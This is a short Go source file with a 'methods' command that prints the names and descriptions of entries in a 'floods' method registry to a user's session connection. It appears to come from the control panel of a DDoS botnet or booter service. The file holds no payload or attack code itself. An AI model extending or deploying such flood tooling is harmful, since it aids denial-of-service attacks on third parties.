package commands

import (
    "fmt"
    "api/core/net/sessions"
	"api/core/models/floods"
)

func methods(session *sessions.Session, args []string) {
        fmt.Fprintf(session.Conn, "    Method  |  Description  \n\r")

	    for name, method := range floods.Methods {
			fmt.Fprintf(session.Conn, "%-10s | %s\n\r", name, method.Description)
		}
}